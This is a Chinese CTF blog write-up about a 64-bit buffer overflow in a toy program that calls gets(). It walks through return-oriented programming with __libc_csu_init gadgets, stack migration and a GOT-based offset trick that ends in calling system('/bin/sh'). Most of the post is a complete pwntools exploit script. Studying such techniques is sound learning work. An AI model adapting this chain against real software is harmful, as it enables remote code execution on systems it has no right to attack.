---
title: GETS_THE_SHELL
date: 2018-11-27 12:33:58
tags: rop pwn
---
开局一gets shell全靠码
<!--more-->
# GTEs
刚学pwn的时候看217的视频...那时候看到这题...当时就只是感觉很麻烦...匆匆看完就没有自己再去实现

出来混的总归要还的...上周的X-nuca就遇到了差不多的题目GETS

那题好像没有leave...不过应该总体思路应该一样...

昨天晚上重做这道看起来简单但是能学到很多东西的题。

# main.c
```c
#include<stdio.h>
int main()
{
    char s[0x10];
    gets(s);
    return 1;
}
```
编译命令
```sh
gcc main.c  -fno-stack-protector -o  gets
```

'简单'的栈溢出

# Analysis
漏洞很简单，利用大思路是:
主要思想是去gets_got上取gets的地址加上与system的offset之后
push入栈后leave到附近call system


在利用的时候你会需要几个基本gadget

# __libc_csu_init
这个函数在gcc编译64位时一半会被编进去
这个函数一般啥事都不干。
但是
```arm
push    r15
push    r14
mov     r15d, edi
push    r13
push    r12
lea     r12, __frame_dummy_init_array_entry
push    rbp
lea     rbp, __do_global_dtors_aux_fini_array_entry
push    rbx
```
在函数开始的时候把一些寄存器内值入栈
我们可以利用这两个特点入栈保存我们的值


这个函数还可以作为x64的通用gadget
主要方式是利用一下两个gadgets可以设置2个参数
call 任何函数
```arm
add     rsp, 8
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```
```arm
mov     rdx, r13
mov     rsi, r14
mov     edi, r15d
call    qword ptr [r12+rbx*8]
```

# migration
之前感觉不到栈转移的强大...这次做题感觉超级好用
简单的套路
```python
pop rbp+ aim-8  + leave 
```
或者预设rbp在某处rop结尾先放好leave

# add_ebx_esi
这个gadgets很奇妙，产生于
```
.text:00000000004004F3                 mov     cs:__bss_start, 1
.text:00000000004004FA
.text:00000000004004FA locret_4004FA:                          ; CODE XREF: __do_global_dtors_aux+7↑j
.text:00000000004004FA                 rep retn
```
1与后面的retn

# 思路

* 利用rsp_r13_r14_r15将栈转移到got上
* 利用在got后面预置的leave和预置的rbp返回
* 将gets的地址放到rbp上
* 利用add_ebx_esi得到system的低4位
* 利用csu_init存入栈
* 再用csu_init将计算得出的高4位入栈，位置恰好是低4位处于低4位组成system
* pop edi 设置/bin/sh 
* leave 到system

# EXP
```python
from pwn import *

binary=ELF("./gets")
bss=binary.bss()

#gadgets
pop_rdi_ret=			0x00000000004005b3
leave=				0x0000000000400544
pop_rsi_r15_ret=		0x00000000004005b1
rbx_rbp_r12_r13_r14_r15_ret=	0x0000000004005AA
do_call=			0x000000000400590
rsp_r13_r14_r15=		0x00000000004005ad
add_ebx_esi=			0x00000000004004f9
gets_got=			0x601020
gets_plt=			0x400410
pop_r15=			0x00000000004005b2
pop_rbp_ret=			0x0000000000400490
csu_init=			0x000000000400550

#value
df=				-0x299f0
off=				-(0x7ffff7a7bd00-0x7ffff7a52390)
off=				off&0xffffffff
addr1=				bss+0x200
addr2=				bss+0x300
addr3=				bss+0x400
addr4=				bss+0x500
addr5=				bss+0x600
aim1=				0x601328
aim2=				0x601430+4



# rop chains
p0=[
pop_rdi_ret,addr1,gets_plt,
pop_rdi_ret,addr2,gets_plt,
pop_rdi_ret,addr3,gets_plt,
pop_rdi_ret,addr5,gets_plt,
pop_rbp_ret,addr1-8,leave
]

p1=[
pop_rdi_ret,gets_got+24,gets_plt,
pop_rbp_ret,addr2-8,
rsp_r13_r14_r15,gets_got
]

p2=[
csu_init,pop_rbp_ret,addr3-0x8,leave
]

p3=[
pop_rdi_ret,aim1-0x8,gets_plt,
pop_rdi_ret,aim1+4*8,gets_plt,
pop_rbp_ret,aim1-0x8-0x8,leave
]

p4=[
leave
]

p5=[
rbx_rbp_r12_r13_r14_r15_ret,
]

p6=[
pop_rdi_ret,addr4,gets_plt,
pop_rbp_ret,0x601378-8,leave
]

p7=[
pop_rsi_r15_ret,off,0,
add_ebx_esi,csu_init,
pop_rbp_ret,addr5-8,leave
]

p8=[
pop_rdi_ret,aim2-0x8,gets_plt,
pop_rdi_ret,aim2+6*8,gets_plt,
pop_rbp_ret,aim2-0x8-0x8,leave
]

p9=[
rbx_rbp_r12_r13_r14_r15_ret,
]

p10=[
pop_rdi_ret,0x601398+4,gets_plt,
pop_rdi_ret,0x601269,gets_plt,
pop_rbp_ret,0x601398+4-0x8,leave
]

p11=[
csu_init,
pop_rdi_ret,0x601269,
pop_rbp_ret,0x601370-0x8,leave
]

p=process("./gets")
#p=remote("10.21.13.69",10010)
p.sendline("\x00"*24+
"".join(map(p64,p0))+"\n"+
"".join(map(p64,p1))+'\n'+
"".join(map(p64,p2))+'\n'+
"".join(map(p64,p3))+'\n'+
"".join(map(p64,p8))+'\n'+
"".join(map(p64,p4))+'\n'+
"".join(map(p64,p5))+'\n'+
"".join(map(p64,p6))+"\n"+
"".join(map(p64,p7))+'\n'+
"".join(map(p64,p9))[:-1]+'\n'+
"".join(map(p64,p10))+'\n'+
"".join(map(p64,p11))+'\n'+
'/bin/sh'+'\n'
)

p.sendline("cat flag")
log.warning(p.read())
p.close()
```

